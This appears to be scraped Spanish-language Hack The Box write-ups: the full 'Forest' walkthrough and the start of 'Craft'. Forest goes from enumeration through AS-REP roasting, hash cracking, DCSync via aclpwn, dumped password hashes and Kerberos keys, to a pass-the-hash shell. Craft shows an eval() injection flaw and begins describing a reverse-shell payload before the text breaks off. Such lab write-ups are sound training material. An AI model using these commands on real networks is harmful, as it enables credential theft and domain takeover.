vamos a iniciar con windows en samba con enum4linux, enumerando los usuarios dentro de la maquina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80  root@kali:~/htb/forest# enum4linux -U -l 10.10.10.161 Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Nov 1 04:31:58 2019 ========================== | Target Information | ========================== Target ........... 10.10.10.161 RID Range ........ 500-550,1000-1050 Username ......... \u0026#39;\u0026#39; Password ......... \u0026#39;\u0026#39; Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none ==================================================== | Enumerating Workgroup/Domain on 10.10.10.161 | ==================================================== [E] Can\u0026#39;t find workgroup/domain ===================================== | Session Check on 10.10.10.161 | ===================================== Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437. [+] Server 10.10.10.161 allows sessions using username \u0026#39;\u0026#39;, password \u0026#39;\u0026#39; Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451. [+] Got domain/workgroup name: ===================================================== | Getting information via LDAP for 10.10.10.161 | ===================================================== [+] Long domain name for 10.10.10.161: htb.local [+] 10.10.10.161 appears to be a root/parent DC =========================================== | Getting domain SID for 10.10.10.161 | =========================================== Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359. Domain Name: HTB Domain Sid: S-1-5-21-3072663084-364016917-1341370565 [+] Host is part of a domain (not a workgroup) ============================= | Users on 10.10.10.161 | ============================= Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866. index: 0x2137 RID: 0x463 acb: 0x00020015 Account: $331000-VK4ADACQNUCA\tName: (null)\tDesc: (null) index: 0xfbc RID: 0x1f4 acb: 0x00020010 Account: Administrator\tName: Administrator\tDesc: Built-in account for administering the computer/domain index: 0x2369 RID: 0x47e acb: 0x00000210 Account: andy\tName: Andy Hislip\tDesc: (null) index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount\tName: (null)\tDesc: A user account managed by the system. index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest\tName: (null)\tDesc: Built-in account for guest access to the computer/domain [... REDACTED ...] index: 0xff4 RID: 0x1f6 acb: 0x00020011 Account: krbtgt\tName: (null)\tDesc: Key Distribution Center Service Account index: 0x2360 RID: 0x47a acb: 0x00000210 Account: lucinda\tName: Lucinda Berger\tDesc: (null) index: 0x236a RID: 0x47f acb: 0x00000210 Account: mark\tName: Mark Brandt\tDesc: (null) index: 0x236b RID: 0x480 acb: 0x00000210 Account: santi\tName: Santi Rodriguez\tDesc: (null) index: 0x235c RID: 0x479 acb: 0x00000210 Account: sebastien\tName: Sebastien Caron\tDesc: (null) index: 0x215a RID: 0x468 acb: 0x00020011 Account: SM_1b41c9286325456bb\tName: Microsoft Exchange Migration\tDesc: (null) index: 0x2161 RID: 0x46c acb: 0x00020011 Account: SM_1ffab36a2f5f479cb\tName: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}\tDesc: (null) index: 0x2156 RID: 0x464 acb: 0x00020011 Account: SM_2c8eef0a09b545acb\tName: Microsoft Exchange Approval Assistant\tDesc: (null) index: 0x2159 RID: 0x467 acb: 0x00020011 Account: SM_681f53d4942840e18\tName: Discovery Search Mailbox\tDesc: (null) index: 0x2158 RID: 0x466 acb: 0x00020011 Account: SM_75a538d3025e4db9a\tName: Microsoft Exchange\tDesc: (null) index: 0x215c RID: 0x46a acb: 0x00020011 Account: SM_7c96b981967141ebb\tName: E4E Encryption Store - Active\tDesc: (null) index: 0x215b RID: 0x469 acb: 0x00020011 Account: SM_9b69f1b9d2cc45549\tName: Microsoft Exchange Federation Mailbox\tDesc: (null) index: 0x215d RID: 0x46b acb: 0x00020011 Account: SM_c75ee099d0a64c91b\tName: Microsoft Exchange\tDesc: (null) index: 0x2157 RID: 0x465 acb: 0x00020011 Account: SM_ca8c2ed5bdab4dc9b\tName: Microsoft Exchange\tDesc: (null) index: 0x2365 RID: 0x47b acb: 0x00010210 Account: svc-alfresco\tName: svc-alfresco\tDesc: (null) Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881. user:[Administrator] rid:[0x1f4] user:[Guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[DefaultAccount] rid:[0x1f7] [... REDACTED ...] user:[sebastien] rid:[0x479] user:[lucinda] rid:[0x47a] user:[svc-alfresco] rid:[0x47b] user:[andy] rid:[0x47e] user:[mark] rid:[0x47f] user:[santi] rid:[0x480] enum4linux complete on Fri Nov 1 04:32:35 2019   KERBEROS - impacket GetNPUsers Obtuvimos poca informacion sobre el puerto de ldap, pero obtuvimos una lista de usuarios, vamos al puerto 88 de autenticacion de kerberos para obtener informacion sobre ese puerto utilizando la lista de usuarios y uno de los scripts de impacket para verificar si uno de los usuarios nos permite recolectar mensajes AS_REP sin pre autenticacion.\nLista de Usuarios:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  Administrator Guest krbtgt DefaultAccount $331000-VK4ADACQNUCA SM_2c8eef0a09b545acb SM_ca8c2ed5bdab4dc9b SM_75a538d3025e4db9a SM_681f53d4942840e18 SM_1b41c9286325456bb SM_9b69f1b9d2cc45549 SM_7c96b981967141ebb SM_c75ee099d0a64c91b SM_1ffab36a2f5f479cb HealthMailboxc3d7722 HealthMailboxfc9daad HealthMailboxc0a90c9 HealthMailbox670628e HealthMailbox968e74d HealthMailbox6ded678 HealthMailbox83d6781 HealthMailboxfd87238 HealthMailboxb01ac64 HealthMailbox7108a4e HealthMailbox0659cc1 sebastien lucinda svc-alfresco andy mark santi   Ejecucion de script de impacket:\n1 2 3 4 5 6 7 8 9 10 11 12  root@kali:~/impacket/examples# python GetNPUsers.py HTB/ -usersfile users -format hashcat -outputfile hashes.asreproast -dc-ip 10.10.10.161 Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation [-] User Administrator doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [... REDACTED ...] [-] User sebastien doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User lucinda doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User andy doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User mark doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User santi doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set   Dentro del archivo de hashes.asreproast encontramos el hash de uno de los usuarios.\nHASHCAT - KERBEROs Utilizamos hashcat para crackear el hash que obtuvimos con el script de impacket.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55  sckull@uplifted:~/tools/hashcat$ ./hashcat64.bin -m 18200 pass_forest -o cracked.txt ../rockyou.txt --force hashcat (v5.1.0) starting... nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: NVIDIA Corporation ====================================== * Device #1: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Applicable optimizers: * Zero-Byte * Not-Iterated * Single-Hash * Single-Salt Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 ATTENTION! Pure (unoptimized) OpenCL kernels selected. This enables cracking passwords and salts \u0026gt; length 32 but for the price of drastically reduced performance. If you want to switch to optimized OpenCL kernels, append -O to your commandline. Watchdog: Temperature abort trigger set to 90c Dictionary cache built: * Filename..: ../rockyou.txt * Passwords.: 14344392 * Bytes.....: 139921507 * Keyspace..: 14344385 * Runtime...: 1 sec Session..........: hashcat Status...........: Cracked Hash.Type........: Kerberos 5 AS-REP etype 23 Hash.Target......: $krb5asrep$23$svc-alfresco@HTB:2f985636440000c102e7...6864af Time.Started.....: Fri Nov 1 02:46:04 2019 (2 secs) Time.Estimated...: Fri Nov 1 02:46:06 2019 (0 secs) Guess.Base.......: File (../rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 2181.4 kH/s (9.63ms) @ Accel:256 Loops:1 Thr:64 Vec:1 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 4128768/14344385 (28.78%) Rejected.........: 0/4128768 (0.00%) Restore.Point....: 4079616/14344385 (28.44%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#1....: s9039554h -\u0026gt; ruddsound1 Hardware.Mon.#1..: Temp: 51c Util: 63% Core:1189MHz Mem:2505MHz Bus:4 Started: Fri Nov 1 02:45:56 2019 Stopped: Fri Nov 1 02:46:07 2019   Pass:\n1  $krb5asrep$23$svc-alfresco@HTB:2f985636440000c102e7a67d333b3d24$7b3a05d397f5ea656b6649ef36dfe3b0c9c5be004550dc64da438b19c056b1caf1c1408ad8840c7cb507c5ca040ad1abf3ceea9d68e13f82fb0d18df542343004c4ec202ae4b9b818457cde2a1ffe74bd8cf0bee3795e74fd1410946c1ae5323e00b3cfceda7f26e053eb6c2e3922dce1095812a6071aeee4a000442ae3f86f3676119df60fdf61bb4f287e3317128664557f0fa6f3b745b5f122afa5612b0c8fc398b2869e97240a81dda272f4ff802914b6c7c59cc80fd5e357097dd2848d66b5f346cf6bfe8de21bf5ba0ef2646c559be47ce0af236c2ce1e45afaf6864af:s3rvice   SMBMAP Utilizamos las credenciales del usuario svc-alfresco para ver en que SHARENAMES tenemos acceso en el puerto de samba.\nConfirmamos que solo tenemos acceso a NETLOGON y SYSVOL con psexec.\nUser - SVC-ALFRESCO En el reporte del escaneo de nmap vemos un puerto en el que podemos utilizar las credenciales para poder obtener una shell en el puerto de WINRM, utilizamos EVIL-WinRM.\n Evil-WinRM  Install: gem install evil-winrm\nPRIVILEGE ESCALATION Utilizamos bloodhound.py para poder obtener la lista de usuarios, permisos de usuarios, grupos de usuarios e importar los datos en bloodhound para ver la ruta que podemos seguir para obtener permisos administrativos utilizando la informacion que nos proporciona bloodhound.\nBooldhound.py Utilizamos las credenciales del usuario svc-alfresco, el dominio y el namesever para obtener los datos.\nComprimimos los archivos en zip.\nBloodhound Importamos los datos que obtuvimos a bloodhound. Nos mostrará un mapa con todos los usuarios disponibles y los grupos de usuarios a los que pertenecen, con los distintos permisos que cada uno tiene, incluso, los permisos que tienen uno sobre otro.\nNos ubicamos en el usuario actual (svc-alfresco) y vemos informacion del usuario, lo que nos interesa es Recehable High Values.\nPodemos ver que el usuario es miembro de varios grupos, y tiene permisos de WriteDACL, que le permiten al usuario modificar permisos de dominio en este caso htb.local y realizar operaciones en DCSync.\nBloodhound nos proporciona cierta informacion que puede ser de utilidad para realizar estas operaciones, para ello nos ubicamos en Writedacl \u0026gt; Help \u0026gt; Abuse Info.\nACLPWN Podemos hacerlo de forma automatizada utilizando esta herramienta, aclpwn permite encontrar y explotar una ruta para obtener privilegios administrativos utilizando los datos obtenidos de bloodhound desde la base de datos.\nRealizamos una busqueda del camino mas cercano:\nLos parametros:\n1 2 3 4 5 6 7 8  -f usuario/computadora (Es el nodo de inicio) -ft user (Especificamos que el nodo inicial es usuario/computadora/dominio/grupo) -t htb.local (El destino al cual deseamos llegar) -tt domain (Especificamos que el destino es usuario/computadora/dominio/grupo) -d htb.local (El Dominio) -du neo4j (Usuario para la base de datos) -dp toor (Contraseña para la base de datos) -dry (Especificamos que no deseamos atacar)   Podemos ver que encontro un camino y puede ser explotado.\n1 2 3 4 5 6 7 8 9 10 11  root@kali:~/tools/aclpwn.py# aclpwn -f svc-alfresco -ft user -t htb.local -tt domain -d htb.local -dry -du neo4j -dp toor [+] Path found! Path [0]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]-\u0026gt;(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]-\u0026gt;(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]-\u0026gt;(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]-\u0026gt;(EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL)-[MemberOf]-\u0026gt;(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]-\u0026gt;(HTB.LOCAL) [!] Unsupported operation: GetChanges on HTB.LOCAL (Domain) [-] Invalid path, skipping [+] Path found! Path [1]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]-\u0026gt;(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]-\u0026gt;(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]-\u0026gt;(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]-\u0026gt;(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]-\u0026gt;(HTB.LOCAL) Please choose a path [0-1] 1 [+] Path validated, the following modifications are required for exploitation in the current configuration: [-] Adding user SVC-ALFRESCO to group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL [-] Modifying domain DACL to give DCSync rights to SVC-ALFRESCO   root@kali:~/tools/impacket/examples# aclpwn -f svc-alfresco -ft user -t htb.local -tt domain -d htb.local -du neo4j -dp toor -s 10.10.10.161 Please supply the password or LM:NTLM hashes of the account you are escalating from: [+] Path found! Path [0]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]-\u0026gt;(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]-\u0026gt;(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]-\u0026gt;(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]-\u0026gt;(EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL)-[MemberOf]-\u0026gt;(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]-\u0026gt;(HTB.LOCAL) [!] Unsupported operation: GetChanges on HTB.LOCAL (Domain) [-] Invalid path, skipping [+] Path found! Path [1]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]-\u0026gt;(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]-\u0026gt;(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]-\u0026gt;(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]-\u0026gt;(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]-\u0026gt;(HTB.LOCAL) Please choose a path [0-1] 1 [-] Memberof -\u0026gt; continue [-] Memberof -\u0026gt; continue [-] Memberof -\u0026gt; continue [-] Adding user SVC-ALFRESCO to group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL [+] Added CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local as member to CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=htb,DC=local [-] Re-binding to LDAP to refresh group memberships of SVC-ALFRESCO@HTB.LOCAL [+] Re-bind successful [-] Modifying domain DACL to give DCSync rights to SVC-ALFRESCO [+] Dacl modification successful [+] Finished running tasks [+] Saved restore state to aclpwn-20191130-014547.restore Ahora que que tenemos permisos DCSync podemos utilizar secretsdump.py para obtener los hash de los usuarios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49  root@kali:~/tools/impacket# secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161 Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets htb.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: [... REDACTED ...] htb.local\\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc::: htb.local\\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3::: htb.local\\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668::: htb.local\\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b::: htb.local\\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7::: htb.local\\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072::: FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:179967e72ed1faea7d8de2f3c2b5d003::: EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1::: [*] Kerberos keys grabbed krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58 krbtgt:des-cbc-md5:9dd5647a31518ca8 [... REDACTED ...] htb.local\\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161 htb.local\\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a htb.local\\sebastien:des-cbc-md5:702a3445e0d65b58 htb.local\\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5 htb.local\\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad htb.local\\lucinda:des-cbc-md5:a13bb56bd043a2ce htb.local\\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32 htb.local\\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea htb.local\\svc-alfresco:des-cbc-md5:014ac86d0b98294a htb.local\\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f htb.local\\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6 htb.local\\andy:des-cbc-md5:a2ab5eef017fb9da htb.local\\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6 htb.local\\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81 htb.local\\mark:des-cbc-md5:b5dff1f40b8f3be9 htb.local\\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427 htb.local\\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25 htb.local\\santi:des-cbc-md5:4075ad528ab9e5fd FOREST$:aes256-cts-hmac-sha1-96:d409d743b2d787ba4a45692058388533840bb55a4d1fd65f8e345164d2df5078 FOREST$:aes128-cts-hmac-sha1-96:c7306933e272b5b5992f9c9ff688eaa2 FOREST$:des-cbc-md5:c8132fbf73c71fa8 EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6 EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e EXCH01$:des-cbc-md5:8c45f44c16975129 [*] Cleaning up...   Logramos obtener los hashes de la mayoria de usuarios, podemos obtener el de un solo usuario, en este caso el que nos interesa es el del usuario administrator.\n1 2 3 4 5 6 7  root@kali:~/tools/impacket# secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161 -just-dc-user administrator Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets htb.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6::: [*] Cleaning up...   Utilizamos psexec.py para obtener nuestra flag root.txt y una shell.\nrlwrap psexec.py htb.local/administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 ","description":"Forest de HackThebox. Encontramos una lista de usuarios con enum4linux los cuales utilizamos con Impacket para realizar AS-REP Roasting attack con lo cual obtuvimos credenciales y acceso por WinRM. Con BloodHound enumeramos y con Aclpwn obtuvimos privilegios administrativos para luego dumpear los hashes y finalmente realizar Pass-the-Hash para obtener una shell como administrador.","id":117,"section":"posts","tags":["enum4linux","kerberos","smbmap","impacket","evil-winrm","bloodhound","aclpwn"],"title":"Hack The Box - Forest","uri":"https://sckull.github.io/posts/forest/"},{"content":"  Craft presenta Gogs donde encontramos el codigo fuente y una vulnerabilidad en una API la cual explotamos para ejecutar una shell inversa. Utilizando credenciales de la base de datos nos conectamos a esta y obtuvimos credenciales para realizar movimiento lateral. Con informacion de los repositorios y de la base de datos obtuvimos acceso al siguiente usuario. El repositorio de Infraestructura nos permitio obtener acceso privilegiado con la informacion de Vault.\nInformacion de la Maquina    Nombre Craft      OS Linux   Puntos 30   Dificultad Media   IP 10.10.10.110   Maker rotarydrone    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[7.7, 8.9, 3.8, 6.2, 1.1], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[6, 10, 1, 9, 0], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     MASSCAN \u0026amp; NMAP 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44  masscan -p1-65535,U:1-65535 10.10.10.110 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-07-30 06:56:40 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 22/tcp on 10.10.10.110 Discovered open port 443/tcp on 10.10.10.110 Discovered open port 6022/tcp on 10.10.10.110 # Nmap 7.70 scan initiated Tue Jul 30 03:13:35 2019 as: nmap -sV -sC -p 22,443,6022 -o nmap.scan 10.10.10.110 Nmap scan report for 10.10.10.110 Host is up (0.13s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0) | ssh-hostkey: | 2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA) | 256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA) |_ 256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519) 443/tcp open ssl/http nginx 1.15.8 |_http-server-header: nginx/1.15.8 |_http-title: About | ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US | Not valid before: 2019-02-06T02:25:47 |_Not valid after: 2020-06-20T02:25:47 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 | tls-nextprotoneg: |_ http/1.1 6022/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-Go | ssh-hostkey: |_ 2048 5b:cc:bf:f1:a1:8f:72:b0:c0:fb:df:a3:01:dc:a6:fb (RSA) 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port6022-TCP:V=7.70%I=7%D=7/30%Time=5D3FEE27%P=x86_64-pc-linux-gnu%r(NU SF:LL,C,\u0026#34;SSH-2\\.0-Go\\r\\n\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Jul 30 03:14:26 2019 -- 1 IP address (1 host up) scanned in 51.23 seconds   HTTPS Visitamos la pagina en HTTPS nos muestra un mensaje que nos habla de una rest API.\nSubdominios Nos movilizamos atravez de las diferentes rutas que nos provee la pagina y encontramos un dominio y dos subdominios, los cuales agregamos a nuestro archivo /etc/hosts.\ncraft.htb api.craft.htb gogs.craft.htb https://api.craft.htb/api/ En la pagina de api nos meustra distintas opciones con las cuales podemos interactuar con una interfaz y tambien nos provee diferentes comandos con curl, para hacer solicitudes a la API.\nhttps://gogs.craft.htb/ En la pagina de gogs nos encontramos con la plataforma gogs que permite el gestionamiento de repositorios, dentro de la misma plataforma nos encontramos con un repositorio.\nCRAFT API Analizamos el codigo que se encuentra en el repositorio el cual pertenece a la rest API que nos menciona la pagina principal (craft.htb), contiene toda la estructura de como funciona esta API. Dentro, encontramos que se hizo un cambio a una parte de codigo que pertenece a la creacion de un nuevo brew de la API.\nDicho cambio incluye una porcion de codigo de python que es vulnerable a ejecucion de comandos remota o RCE.\nPorcion de codigo vulnerable especificamente eval():\n1 2  if eval(\u0026#39;%s\u0026gt; 1\u0026#39; % request.json[\u0026#39;abv\u0026#39;]): return \u0026#34;ABV must be a decimal value less than 1.0\u0026#34;, 400   Python Code Injection\nAdemas de eso encontramos un archivo test.py que contiene un usuario y contraseña para generar un token, para luego crear un \u0026lsquo;brew\u0026rsquo; insatisfactorio y satisfactoriamente. El primero contiene un numero con punto decimal mayor a 1 que debe de ser rechazado por la API. El segundo un numero menor a 1 con punto decimal que debe de ser aceptado por la API.\nArchivo test.py:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  #!/usr/bin/env python import requests import json response = requests.get(\u0026#39;https://api.craft.htb/api/auth/login\u0026#39;, auth=(\u0026#39;dinesh\u0026#39;, \u0026#39;4aUh0A8PbVJxgd\u0026#39;), verify=False) json_response = json.loads(response.text) token = json_response[\u0026#39;token\u0026#39;] headers = { \u0026#39;X-Craft-API-Token\u0026#39;: token, \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39; } # make sure token is valid response = requests.get(\u0026#39;https://api.craft.htb/api/auth/check\u0026#39;, headers=headers, verify=False) print(response.text) # create a sample brew with bogus ABV... should fail. print(\u0026#34;Create bogus ABV brew\u0026#34;) brew_dict = {} brew_dict[\u0026#39;abv\u0026#39;] = \u0026#39;15.0\u0026#39; brew_dict[\u0026#39;name\u0026#39;] = \u0026#39;bullshit\u0026#39; brew_dict[\u0026#39;brewer\u0026#39;] = \u0026#39;bullshit\u0026#39; brew_dict[\u0026#39;style\u0026#39;] = \u0026#39;bullshit\u0026#39; json_data = json.dumps(brew_dict) response = requests.post(\u0026#39;https://api.craft.htb/api/brew/\u0026#39;, headers=headers, data=json_data, verify=False) print(response.text) # create a sample brew with real ABV... should succeed. print(\u0026#34;Create real ABV brew\u0026#34;) brew_dict = {} brew_dict[\u0026#39;abv\u0026#39;] = \u0026#39;0.15\u0026#39; brew_dict[\u0026#39;name\u0026#39;] = \u0026#39;bullshit\u0026#39; brew_dict[\u0026#39;brewer\u0026#39;] = \u0026#39;bullshit\u0026#39; brew_dict[\u0026#39;style\u0026#39;] = \u0026#39;bullshit\u0026#39; json_data = json.dumps(brew_dict) response = requests.post(\u0026#39;https://api.craft.htb/api/brew/\u0026#39;, headers=headers, data=json_data, verify=False) print(response.text)   Prueba del archivo test.py:\nRCE - Craft API Para poder ejecutar comandos y obtener una shell inversa a travez de la vulnerabilidad que encontramos en el codigo del repositorio vamos a modificar el archivo test.py, agregandole un comando que va a ser ejecutado por la funcion eval(). Agregamos nuestra shell inversa \u0026ldquo;escapando\u0026rdquo; todas los backslash que se encuentran para no tener ningun problema 